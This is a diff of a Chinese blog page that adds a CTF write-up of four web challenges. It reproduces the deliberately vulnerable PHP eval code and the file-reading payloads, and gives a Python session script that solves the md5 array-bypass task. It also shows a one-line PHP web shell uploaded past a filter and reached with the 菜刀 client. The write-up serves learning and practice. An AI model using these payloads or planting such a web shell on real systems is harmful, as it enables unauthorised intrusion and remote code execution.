@@ -203,12 +203,23 @@
 </head>
 
     
+        <body class="post-body">
+    
     
 <header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">Lemon&#39;s blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name"></a>
+            </div>
+    </div>
     
     <a class="home-link" href="/">Lemon's blog</a>
 </header>
@@ -220,24 +231,68 @@
 
 
 
+
+height:50vh;
 ">
     
     <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/sss.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
+            
+            [Untitled Post]
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
+            
+            <!-- 404 -->
+            
         </p>
         <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">1.6k</span>阅读时长: <span class="post-count reading-time">6 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/07/20</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
         
     </div>
 </div>
@@ -340,16 +395,35 @@
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <pre><code>有时乐观开朗，有时冷漠高冷，I am what I am
+        <p>前言：总结一下最近做的web题，从题中可以学习到很多知识。</p>
+<h6 id="爆破-1"><a href="#爆破-1" class="headerlink" title="爆破-1"></a><strong>爆破-1</strong></h6><p><img src="http://i2.tiimg.com/690112/64a7ba4debe23953.png" alt="在这里插入图片描述"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">$a = @$_REQUEST[<span class="string">'hello'</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/^\w*$/'</span>,$a ))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">'ERROR'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"var_dump($$a);"</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>给了一段PHP代码，里面还有简单的正则表达式，那就来分析一下。</p>
+<p><code>/</code>表示的是正则表达式的开始和结束，<code>^或\A</code>    匹配字符串开始位置，<code>\w</code>匹配任意数字或字母或下划线(a-z,A-Z,0-9,_)，<code>*</code>匹配0次、或1次、或多次其前面的字符(相当于可以输入多个字符、数字、或下划线)，<code>$或者\Z</code>匹配字符串的结束位置。所以在这里我们输入<code>hello</code>可以执行</p>
+<p>提示有说flag在某个变量中，还观察到<code>var_dump($$a)</code>，可以使用超全局变量<code>$GLOBALS</code>，直接在url中构造<code>?hello=GLOBALS</code>即可flag。<br><img src="http://i2.tiimg.com/690112/76010ec6c94dfad2.png" alt="在这里插入图片描述"></p>
+<p><strong>做题小结</strong>：这道题之所以能够用超全局变量，就是因为输出时又多了一个<code>$</code>,利用它构造一系列超全局变量,得出我们想要的信息。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER 这种超全局变量保存关于报头、路径和脚本位置的信息</span><br><span class="line">$_REQUEST 用于收集 HTML 表单提交的数据</span><br><span class="line">$_POST 广泛用于收集提交 method=<span class="string">"post"</span> 的 HTML 表单后的表单数据。</span><br><span class="line">$_GET 也可用于收集提交 HTML 表单 (method=<span class="string">"get"</span>) 之后的表单数据</span><br></pre></td></tr></table></figure></p>
+<h6 id="爆破-2"><a href="#爆破-2" class="headerlink" title="爆破-2"></a><strong>爆破-2</strong></h6><p><img src="http://i2.tiimg.com/690112/1edac1dcde67f5bb.png" alt="在这里插入图片描述"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include <span class="string">"flag.php"</span>;</span><br><span class="line">$a = @$_REQUEST['hello'];</span><br><span class="line">eval( <span class="string">"var_dump($a);"</span>);</span><br><span class="line">show_source(__FILE__);</span><br></pre></td></tr></table></figure>
+<p>提示说flag不在变量中，用<code>$GLOBALS</code>查看果然不在。<img src="http://i2.tiimg.com/690112/926c420b52c4f337.png" alt="在这里插入图片描述"><br>不在变量中，那就查flag.php文件，查到一个<code>file_get_contents() 函数</code>可以把整个文件读入一个字符串中。<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?hello=file_get_contents('flag.php')</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://i2.tiimg.com/690112/4c9d986ad8c43a71.png" alt="在这里插入图片描述"><br>除此之外，我们还可以用另一个函数<code>file()函数</code>。<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?hello=file('flag.php')</span><br></pre></td></tr></table></figure></p>
+<p>即可得出flag<br><img src="http://i2.tiimg.com/690112/886e34dad39eb57d.png" alt="在这里插入图片描述"><br>还可以<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?hello=readfile('flag.php')</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://i2.tiimg.com/690112/b999cdda42a5485a.png" alt="在这里插入图片描述"><br><strong>做题小结</strong>:通过上面三种方法，利用三种不同的函数，都可以得出flag，下面就区分一下他们之间的区别。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file() 函数是把整个文件读入一个数组中，然后将文件作为一个数组返回。</span><br><span class="line">readfile() 函数读取一个文件，并写入到输出缓冲。如果成功，该函数返回从文件中读入的字节数。如果失败，该函数返回 <span class="keyword">FALSE</span> 并附带错误信息。您可以通过在函数名前面添加一个 <span class="string">'@'</span> 来隐藏错误输出。</span><br><span class="line">file_get_contents() 把整个文件读入一个字符串中。</span><br></pre></td></tr></table></figure></p>
+<h6 id="爆破-3"><a href="#爆破-3" class="headerlink" title="爆破-3"></a><strong>爆破-3</strong></h6><p><img src="http://i2.tiimg.com/690112/cefa6a3e2091fde3.png" alt="在这里插入图片描述"><br>给了一串php代码，分析一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); <span class="comment">//关闭错误报告</span></span><br><span class="line">session_start();	<span class="comment">//开启session</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">'./flag.php'</span>);	<span class="comment">//引入flag文件</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'nums'</span>]))&#123;</span><br><span class="line">  $_SESSION[<span class="string">'nums'</span>] = <span class="number">0</span>;</span><br><span class="line">  $_SESSION[<span class="string">'time'</span>] = time();<span class="comment">//time() 函数返回自 Unix 纪元（January 1 1970 00:00:00 GMT）起的当前时间的秒数。</span></span><br><span class="line">  $_SESSION[<span class="string">'whoami'</span>] = <span class="string">'ea'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'time'</span>]+<span class="number">120</span>&lt;time())&#123;</span><br><span class="line">  session_destroy();<span class="comment">//session_destroy() 将重置 session，您将失去所有已存储的 session 数据</span></span><br><span class="line">&#125;</span><br><span class="line">$value = $_REQUEST[<span class="string">'value'</span>];<span class="comment">//$_REQUEST 用于收集 HTML 表单提交的数据</span></span><br><span class="line">$str_rand = range(<span class="string">'a'</span>, <span class="string">'z'</span>);</span><br><span class="line">$str_rands = $str_rand[mt_rand(<span class="number">0</span>,<span class="number">25</span>)].$str_rand[mt_rand(<span class="number">0</span>,<span class="number">25</span>)];<span class="comment">//mt_rand() 使用 Mersenne Twister 算法返回随机整数</span></span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'whoami'</span>]==</span><br><span class="line">($value[<span class="number">0</span>].$value[<span class="number">1</span>]) &amp;&amp; substr(md5($value),<span class="number">5</span>,<span class="number">4</span>)==<span class="number">0</span>)&#123;<span class="comment">//a . b 	并置 	连接两个字符串 	"Hi" . "Ha" 	HiHa</span></span><br><span class="line">  $_SESSION[<span class="string">'nums'</span>]++;<span class="comment">//substr() 函数返回字符串的一部分。//如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。</span></span><br><span class="line">  $_SESSION[<span class="string">'whoami'</span>] = $str_rands;<span class="comment">//substr(string,start,length)</span></span><br><span class="line">  <span class="keyword">echo</span> $str_rands;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'nums'</span>]&gt;=<span class="number">10</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>前两个if语句简单，重要的是如下语句<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$value = $_REQUEST[<span class="string">'value'</span>];</span><br><span class="line">$str_rand = range(<span class="string">'a'</span>, <span class="string">'z'</span>);</span><br><span class="line">$str_rands = $str_rand[mt_rand(<span class="number">0</span>,<span class="number">25</span>)].$str_rand[mt_rand(<span class="number">0</span>,<span class="number">25</span>)];</span><br></pre></td></tr></table></figure></p>
+<p><code>$str_rand</code>会从a到z中随机取一个字母。<code>$str_rand[mt_rand(0,25)].$str_rand[mt_rand(0,25)]</code>会拼凑成两个字母赋值给<code>$str_rands</code>。<br>然后就来观察以下代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'whoami'</span>]==</span><br><span class="line">($value[<span class="number">0</span>].$value[<span class="number">1</span>]) &amp;&amp; substr(md5($value),<span class="number">5</span>,<span class="number">4</span>)==<span class="number">0</span>)&#123;<span class="comment">//a . b 	并置 	连接两个字符串 	"Hi" . "Ha" 	HiHa</span></span><br><span class="line">  $_SESSION[<span class="string">'nums'</span>]++;<span class="comment">//substr() 函数返回字符串的一部分。//如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。</span></span><br><span class="line">  $_SESSION[<span class="string">'whoami'</span>] = $str_rands;<span class="comment">//substr(string,start,length)</span></span><br><span class="line">  <span class="keyword">echo</span> $str_rands;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'nums'</span>]&gt;=<span class="number">10</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>很明了了，<code>因为$_SESSION[&#39;nums&#39;] = 0</code>，我们只需将上面的if语句循环十次（即<code>$_SESSION[&#39;nums&#39;]++</code>循环十次），即可得出flag。</p>
+<p>接下来就来构造语句，一开始的<code>$_SESSION[&#39;whoami&#39;]</code> = ‘ea’，因此就构造<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?value[<span class="number">0</span>]=e&amp;value[<span class="number">1</span>]=a</span><br></pre></td></tr></table></figure></p>
+<p>又因为每执行一次，<code>$_SESSION[&#39;whoami&#39;]</code>会变化而且值与<code>$str_rands</code>相同，并且每执行一次都会输出<code>$str_rands</code>的值，因此只要按照这个顺序输入十次即可得出flag。<br><img src="http://i2.tiimg.com/690112/654663652474ce85.png" alt="在这里插入图片描述"><br>当然可以也可以写一个脚本来做这道题，但是我们还漏掉了一个很重要的细节就是<code>substr(md5($value),5,4)==0</code>，这个有什么作用那？可以写一个简单的脚本来测试一下看看<br><img src="http://i2.tiimg.com/690112/b3ad4b1936880b43.png" alt="在这里插入图片描述"><br>以数组的形式传入<br><img src="http://i2.tiimg.com/690112/1ce757ab54b5c1b5.png" alt="在这里插入图片描述"><br>所以刚才只要用<code>数组进行</code>传参就没有问题。</p>
+<p>当然我们分析一下就可以知道这个条件<code>在数组的情况下</code>永远为真，因为在数组的情况下是不能MD5加密的，所以肯定<code>==0</code>.</p>
+<p>也可以写一个脚本来跑出flag，恰好最近在学python，参考大佬自己也模仿写一下<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">'http://8e7202f5492447d5ab76eb8b7e8b4b27838e55901eba4c5f.changame.ichunqiu.com'</span></span><br><span class="line"><span class="comment"># 创建一个session对象  </span></span><br><span class="line">session=requests.Session()</span><br><span class="line"><span class="comment"># 发送请求</span></span><br><span class="line">html=session.get(url+<span class="string">'?value[]=ea'</span>).text</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    html=session.get(url+<span class="string">'?value[]='</span>+ html[<span class="number">0</span>:<span class="number">2</span>]).text</span><br><span class="line">print(html)</span><br></pre></td></tr></table></figure></p>
+<p>得到flag<br><img src="http://i2.tiimg.com/690112/a29d257ce22f03e8.png" alt="在这里插入图片描述"></p>
+<p><strong>做题小结</strong>：web题有很多解法，但最基础的是一定要会写脚本，得加快进度学习python了<br><a href="https://www.cnblogs.com/lingxia/p/9074620.html" target="_blank" rel="noopener">python中requests.session的妙用</a><br><a href="https://www.cnblogs.com/zy6103/p/8977833.html" target="_blank" rel="noopener">python学习之-requests模块基础</a><br><a href="https://www.jianshu.com/p/264955856e61" target="_blank" rel="noopener">requests session的作用</a></p>
+<h6 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a><strong>Upload</strong></h6><p><img src="http://i2.tiimg.com/690112/a06d41d80a26813b.png" alt="在这里插入图片描述"><br><img src="http://i2.tiimg.com/690112/b6c242cb692e4b35.png" alt="在这里插入图片描述"><br>看到文件上传，就想起来用<code>一句话木马＋菜刀</code>，那就来先构造一句话木马。<br><img src="http://i2.tiimg.com/690112/e9dc252bdbe1504e.png" alt="在这里插入图片描述"><br>上传<br><img src="http://i2.tiimg.com/690112/255b22901d414a89.png" alt="在这里插入图片描述"><br>显示上传成功，我们来查看一下上传之后的php文件<br><img src="http://i2.tiimg.com/690112/4c2d4413fb457b50.png" alt="在这里插入图片描述"><br>把<code>&lt;?php</code>给过滤了，那换一种方法，在大佬的博客上发现绕过&lt;?限制的一句话</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">"php"</span>&gt;@eval_r($_POST[pass])&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>拿来试试<br><img src="http://i2.tiimg.com/690112/c6ccb97b697deb95.png" alt="在这里插入图片描述"><br>发现php被过滤掉了，那就将php改为大写PHP试试<br><img src="http://i2.tiimg.com/690112/595a85cc4f441820.png" alt="在这里插入图片描述"><br>没有显示，说明已经传进去了，菜刀连接<br><img src="http://i2.tiimg.com/690112/24b15b46d6817377.png" alt="在这里插入图片描述"><br>通过源代码可以知道上传路径，连接即可得出flag。</p>
+<p>做题小结：和XSS一样，一句话木马也有很多绕过姿势，有空一定要总结一下一句话各种绕过姿势，最后附上大佬博客。<br><a href="https://my.oschina.net/programs/blog/1649544" target="_blank" rel="noopener">PHP一句话木马后门</a><br><a href="https://www.freebuf.com/articles/web/195304.html" target="_blank" rel="noopener">一句话木马的套路 </a><br><a href="https://www.uedbox.com/post/6051/" target="_blank" rel="noopener">那些强悍的PHP一句话后门</a></p>
 
-喜欢旅游，去见更大的世界，更广的天空，同样喜欢美食.
-
-    对计算机超感兴趣，我会一直努力，不断向前。
-
-（Nothing great was ever achieved without enthusiasm）
-</code></pre><p>​                </p>
-<pre><code>如果您愿意请我喝瓶可乐的话，我会更加努力的😄
-</code></pre>
     </article>
     <!-- license  -->
     
@@ -359,6 +433,11 @@
             
         </li>
         <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2019/07/16/2019安恒七月月赛——MISC/" title="2019安恒七月月赛——MISC">
+                    <div class="prevTitle">2019安恒七月月赛——MISC</div>
+                </a>
             
         </li>
     </ul>
@@ -466,6 +545,24 @@
 </footer>
     </div>
     <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-6"><a class="toc-link" href="#爆破-1"><span class="toc-number">1.</span> <span class="toc-text">爆破-1</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#爆破-2"><span class="toc-number">2.</span> <span class="toc-text">爆破-2</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#爆破-3"><span class="toc-number">3.</span> <span class="toc-text">爆破-3</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Upload"><span class="toc-number">4.</span> <span class="toc-text">Upload</span></a></li></ol>
+    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -1001,6 +1098,8 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
